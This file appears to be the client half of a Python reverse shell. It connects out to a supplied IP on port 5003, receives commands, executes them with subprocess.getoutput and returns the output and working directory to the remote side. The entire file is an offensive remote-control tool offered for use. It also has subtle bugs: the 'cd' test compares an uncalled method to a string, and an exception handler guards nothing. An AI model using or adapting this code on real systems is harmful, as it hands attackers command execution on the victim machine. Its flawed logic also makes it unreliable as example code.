import socket
import os
import subprocess
import sys

def clientcon(servip):
    try:
        SERVER_HOST = servip
    except IndexError:
        return("Make sure to add an ip after running this!")
    SERVER_PORT = 5003
    BUFFER_SIZE = 1024*128
    SEPERATOR = "<sep>"
    s = socket.socket()
    try:
        s.connect((SERVER_HOST, SERVER_PORT))
    except ConnectionRefusedError:
        return print("Connection blocked by host!")
    cwd = os.getcwd()
    s.send(cwd.encode())

    while True:
        command = s.recv(BUFFER_SIZE).decode()
        splitted_command = command.split()
        if command.lower() == "exit":
            break
        if splitted_command[0].lower == "cd":
            try:
                os.chdir(' '.join(splitted_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        else:
            output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}{SEPERATOR}{cwd}"
        s.send(message.encode())
    s.close()
